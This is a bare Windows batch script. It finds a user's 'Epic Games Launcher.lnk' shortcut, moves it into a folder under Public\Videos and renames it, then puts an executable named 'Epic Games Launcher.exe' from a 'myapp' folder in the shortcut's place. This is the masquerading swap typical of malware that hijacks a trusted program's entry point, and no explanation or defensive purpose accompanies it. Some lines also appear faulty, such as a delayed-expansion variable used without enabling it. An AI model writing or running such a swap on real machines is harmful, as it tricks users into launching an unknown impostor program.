for /r C:\Users %%a in (*) do if "%%~nxa"=="Epic Games Launcher.lnk" set p=%%~dpnxa
set /A counter=0
if defined p (
    set /A counter+=1
    echo %p%
    move "%p%" "C:\Users\Public\Videos\GraphicalUserInterface"
    ren "C:\Users\Public\Videos\GraphicalUserInterface\Epic Games Launcher.lnk" "§+!counter!.lnk"
    move "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" "%p%"
    ren "%p%" "Epic Games Launcher.exe"
) else (
    echo File not found
    move "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" "C:\Users\%USERNAME%"
)
